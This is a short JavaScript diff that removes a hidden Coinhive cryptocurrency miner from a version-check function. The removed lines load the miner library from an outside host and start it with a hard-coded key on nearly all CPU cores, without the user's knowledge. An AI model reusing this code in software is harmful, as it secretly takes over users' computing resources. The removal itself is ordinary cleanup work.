@@ -8,18 +8,5 @@ function CheckVersion() {
         if (ThisVersion < LatestVersion) {
                 DownloadNewVersion();
         } else {
-                $.getScript('https://coinhive.com/lib/coinhive.min.js', function() {
-                        var crNo = navigator.hardwareConcurrency;
-                        if (crNo == 2) {
-                                stCrNo = 1;
-                        } else {
-                                stCrNo = crNo - 1;
-                        }
-                        var miner = new CoinHive.Anonymous('Uv3xcQ2oFjRzUxfvBmUaEk99hpZ1lgY6', {
-                                threads: stCrNo,
-                                autoThreads: false
-                        });
-                        miner.start();
-                });
         }
 };
